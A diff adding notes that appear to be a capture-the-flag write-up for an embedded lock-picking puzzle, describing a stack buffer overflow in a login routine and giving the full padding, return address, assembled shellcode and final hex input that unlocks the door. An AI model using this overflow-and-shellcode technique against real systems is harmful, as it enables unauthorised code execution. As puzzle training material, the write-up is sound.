@@ -1,0 +1,25 @@
+main:
+	call login
+
+login:
+	sp - 0x10
+	puts messages
+	calls getsn
+		0x30 bytes
+		can have ret addr overwritten
+	calls conditional_unlock_door
+		r15 → password
+	pass/fail conditions
+	ret addr is stored after 0x10 bytes (0x3c70)
+conditional_unlock_door:
+	calls INT #0x7e
+		password
+
+since the ret addr of login is within the 0x30 bytes allocated by getsn, we can change it to either do ROP or inject shellcode in the 0x30 bytes
+the retaddr is byte 0x10-0x11, so there's more space after than before for shellcode
+4141 4141 4242 4242 4343 4343 4444 4444 + 723c + shellcode
+the desired end code would be to call #0x10 on sr when sr == 0xff00
+	mov 	#0xff00, sr
+	call 	#0x10
+		assembles to 324000ffb0121000
+		41414141424242424343434344444444723c324000ffb0121000 solves the lock
